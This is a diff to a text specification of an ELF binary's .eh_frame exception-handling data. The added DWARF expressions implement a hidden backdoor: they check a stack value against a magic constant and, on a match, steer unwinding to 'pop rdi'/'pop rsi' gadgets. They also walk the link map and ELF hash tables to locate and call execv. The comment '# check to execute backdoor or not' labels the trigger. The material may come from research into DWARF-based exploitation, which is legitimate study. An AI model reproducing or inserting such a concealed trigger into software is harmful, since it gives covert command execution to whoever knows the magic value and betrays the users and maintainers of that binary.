@@ -1,8 +1,8 @@
 section_type: ".eh_frame"
 #
-section_addr: 0x400f90
-eh_hdr_addr: 0x400f38
-except_table_addr: 0x401174
+section_addr: 0x400f80
+eh_hdr_addr: 0x400f28
+except_table_addr: 0x401164
 eh_hdr_table_enc: DW_EH_PE_sdata4, DW_EH_PE_datarel
 begin CIE
 index: 0
@@ -12,7 +12,7 @@ code_align: 1
 return_addr_rule: 16
 fde_ptr_enc: DW_EH_PE_sdata4, DW_EH_PE_pcrel
 begin INSTRUCTIONS
-DW_CFA_def_cfa r7 8 
+DW_CFA_def_cfa r7 8
 DW_CFA_offset r16 1
 DW_CFA_undefined r0
 end INSTRUCTIONS
@@ -25,7 +25,7 @@ code_align: 1
 return_addr_rule: 16
 fde_ptr_enc: DW_EH_PE_sdata4, DW_EH_PE_pcrel
 begin INSTRUCTIONS
-DW_CFA_def_cfa r7 8 
+DW_CFA_def_cfa r7 8
 DW_CFA_offset r16 1
 end INSTRUCTIONS
 end CIE
@@ -38,9 +38,9 @@ return_addr_rule: 16
 fde_ptr_enc: DW_EH_PE_sdata4, DW_EH_PE_pcrel
 fde_lsda_ptr_enc: DW_EH_PE_udata4
 personality_ptr_enc: DW_EH_PE_udata4
-personality: 0x4009b0
+personality: 0x4009a0
 begin INSTRUCTIONS
-DW_CFA_def_cfa r7 8 
+DW_CFA_def_cfa r7 8
 DW_CFA_offset r16 1
 end INSTRUCTIONS
 end CIE
@@ -48,7 +48,7 @@ end CIE
 # begin FDE
 # index: 0
 # cie_index: 1
-# initial_location: 0x4008c0
+# initial_location: 0x4008b0
 # address_range: 0x130
 # begin INSTRUCTIONS
 # DW_CFA_def_cfa_offset 16
@@ -72,7 +72,7 @@ end CIE
 begin FDE
 index: 0
 cie_index: 2
-initial_location: 0x4009f0
+initial_location: 0x4009e0
 address_range: 0xd0
 lsda_idx: 0x0
 begin INSTRUCTIONS
@@ -94,7 +94,7 @@ end FDE
 # begin FDE
 # index: 2
 # cie_index: 0
-# initial_location: 0x400ac0
+# initial_location: 0x400ab0
 # address_range: 0x2a
 # begin INSTRUCTIONS
 # end INSTRUCTIONS
@@ -103,7 +103,7 @@ end FDE
 # begin FDE
 # index: 3
 # cie_index: 1
-# initial_location: 0x400bc0
+# initial_location: 0x400bb0
 # address_range: 0xb
 # begin INSTRUCTIONS
 # DW_CFA_advance_loc 4
@@ -114,7 +114,7 @@ end FDE
 # begin FDE
 # index: 4
 # cie_index: 1
-# initial_location: 0x400bd0
+# initial_location: 0x400bc0
 # address_range: 0x1a
 # begin INSTRUCTIONS
 # DW_CFA_advance_loc 1
@@ -128,7 +128,7 @@ end FDE
 # begin FDE
 # index: 5
 # cie_index: 1
-# initial_location: 0x400bf0
+# initial_location: 0x400be0
 # address_range: 0x76
 # begin INSTRUCTIONS
 # DW_CFA_advance_loc 2
@@ -181,7 +181,7 @@ end FDE
 begin FDE
 index: 1
 cie_index: 1
-initial_location: 0x400c70
+initial_location: 0x400c60
 address_range: 0x1b0
 begin INSTRUCTIONS
 DW_CFA_advance_loc 2
@@ -208,24 +208,44 @@ DW_CFA_advance_loc 1
 DW_CFA_restore_state
 DW_CFA_val_expression r7
 begin EXPRESSION
-DW_OP_breg7 -48 
+DW_OP_breg7 -648
 end EXPRESSION
-DW_CFA_val_expression r13
+DW_CFA_val_expression r11
 begin EXPRESSION
-DW_OP_constu 0x6014c0
-end EXPRESSION
-DW_CFA_val_expression r3
-begin EXPRESSION
-DW_OP_constu 0x6014ce
+# check to execute backdoor or not
+DW_OP_breg7 +0
+DW_OP_deref
+DW_OP_deref
+# 0x2a303f26575f5451
+DW_OP_constu 0x2a303f26
+DW_OP_constu 0x20
+DW_OP_shl
+DW_OP_constu 0x575f5451
+DW_OP_plus
+DW_OP_xor
+DW_OP_bra WRONG
+DW_OP_constu 0x400e73 # pop rdi
+DW_OP_skip EXIT
+WRONG:
+DW_OP_constu 0x400a96 # normal return
+EXIT:
 end EXPRESSION
 DW_CFA_val_expression r12
 begin EXPRESSION
-DW_OP_constu 0x0
+DW_OP_constu 0x6014c0
 end EXPRESSION
-DW_CFA_val_expression r6
+DW_CFA_val_expression r13
+begin EXPRESSION
+DW_OP_constu 0x400c2a # pop rsi
+end EXPRESSION
+DW_CFA_val_expression r14
+begin EXPRESSION
+DW_OP_constu 0x6014ce
+end EXPRESSION
+DW_CFA_val_expression r15
 begin EXPRESSION
 #DW_OP_constu 0x601218 #the address where we will find the address of the linkmap. This is 8 more than the value of PLTGOT in .dynamic
-DW_OP_constu 0x6013c8 #the address where we will find the address of the linkmap. This is 8 more than the value of PLTGOT in .dynamic
+DW_OP_constu 0x6013a8 #the address where we will find the address of the linkmap. This is 8 more than the value of PLTGOT in .dynamic
 DW_OP_deref #dereference above
 #now on the top of the stack we have the address of the beginning of
 #the link map. The important field in link_map for the moment is the
@@ -339,7 +359,8 @@ DW_OP_plus
 #5. text base address
 #now we have to compute the symbol hash mod the number of buckets
 #DW_OP_constu 7138204 #elf_hash("execl")
-DW_OP_constu 216771845 #elf_hash("execvpe")
+#DW_OP_constu 216771845 #elf_hash("execvpe")
+DW_OP_constu 7138214 #elf_hash("execv")
 DW_OP_pick 3 #nBuckets
 DW_OP_mod
 #Stack is now
@@ -358,7 +379,7 @@ DW_OP_plus
 #now we have the address of a symbol index
 DW_OP_deref_size 4 #now we have a symbol index
 DW_OP_dup
-#####chain loop begins here 
+#####chain loop begins here
 CHAIN:
 #0  sym idx
 #1. sym idx
@@ -414,7 +435,7 @@ DW_OP_deref_size 1
 #4. symbol address
 #5. sym idx
 #etc
-#####begin strcmp loop 
+#####begin strcmp loop
 STRCMP:
 #we want to exit the loop if one character is NULL
 DW_OP_over
@@ -456,8 +477,8 @@ DW_OP_plus
 DW_OP_dup
 DW_OP_deref_size 1 #get the next character
 DW_OP_swap
-#stack is 
-#0. stored address  
+#stack is
+#0. stored address
 #1. next character from stored
 #2. symbol name address
 #etc
@@ -492,7 +513,7 @@ CHAIN_NEXT:
 #etc
 #we drop the first three entries, we don't care about them any more as
 #we are going to the next symbol in the chain
-DW_OP_drop 
+DW_OP_drop
 DW_OP_drop
 DW_OP_drop
 #stack is now
@@ -566,25 +587,6 @@ DW_OP_drop
 #1. text base address
 DW_OP_plus
 #now we should have the address of execl on the top of the stack
-#DW_OP_constu 0x133 #we want to start 0x133 bytes into the function
-DW_OP_constu 0x32
-DW_OP_plus
-# check to execute backdoor or not
-DW_OP_breg7 +0
-DW_OP_deref
-DW_OP_deref
-# 0x2a303f26575f5451
-DW_OP_constu 0x2a303f26
-DW_OP_constu 0x20
-DW_OP_shl
-DW_OP_constu 0x575f5451
-DW_OP_plus
-DW_OP_xor
-DW_OP_bra WRONG
-DW_OP_skip EXIT
-WRONG:
-DW_OP_constu 0x400a96
-EXIT:
 end EXPRESSION
 end INSTRUCTIONS
 end FDE
@@ -592,7 +594,7 @@ end FDE
 # begin FDE
 # index: 7
 # cie_index: 1
-# initial_location: 0x400e20
+# initial_location: 0x400e10
 # address_range: 0x65
 # begin INSTRUCTIONS
 # DW_CFA_advance_loc 2
@@ -635,7 +637,7 @@ end FDE
 # begin FDE
 # index: 8
 # cie_index: 1
-# initial_location: 0x400e90
+# initial_location: 0x400e80
 # address_range: 0x2
 # begin INSTRUCTIONS
 # end INSTRUCTIONS
@@ -655,7 +657,7 @@ end CALL_SITE
 begin CALL_SITE
 position: 0x96
 length: 0x5
-# landing_pad: 0xa6
+# landing_pad: 0xa5
 landing_pad: 0xa5
 has_action: true
 first_action: 0
